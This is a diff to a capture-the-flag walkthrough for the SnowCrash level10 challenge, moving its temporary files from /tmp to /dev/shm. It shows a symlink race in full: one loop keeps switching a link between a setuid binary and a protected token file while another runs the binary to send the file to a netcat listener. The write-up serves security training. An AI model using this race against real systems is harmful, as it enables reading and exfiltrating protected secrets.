@@ -37,8 +37,8 @@ level10@SnowCrash:~$ nc 6969 -l
 ```
 Back in the first terminal, if we create a file and send it to ourselves, it arrives in the second terminal.
 ```
-level10@SnowCrash:~$ echo "oh hi" > /tmp/hi
-level10@SnowCrash:~$ ./level10 /tmp/hi {VM_IP}
+level10@SnowCrash:~$ echo "oh hi" > /dev/shm/hi
+level10@SnowCrash:~$ ./level10 /dev/shm/hi {VM_IP}
 Connecting to {VM_IP}:6969 .. Connected!
 Sending file .. wrote file!
 ```
@@ -57,11 +57,11 @@ level10@SnowCrash:~$ nm -u level10
 
 So lets create an infinite loop which switches a symbolic link between the binary and the token.
 ```
-level10@SnowCrash:~$ while true; do ln -fs ~/level10 /tmp/symlink; ln -fs ~/token /tmp/symlink; done
+level10@SnowCrash:~$ while true; do ln -fs ~/level10 /dev/shm/symlink; ln -fs ~/token /dev/shm/symlink; done
 ```
 Then run the binary on the symbolic link.
 ```
-level10@SnowCrash:~$ while true; do ./level10 /tmp/symlink {VM_IP}; done
+level10@SnowCrash:~$ while true; do ./level10 /dev/shm/symlink {VM_IP}; done
 ```
 Then when we listen, sometimes its garbage, but sometimes we read the token!
 ```
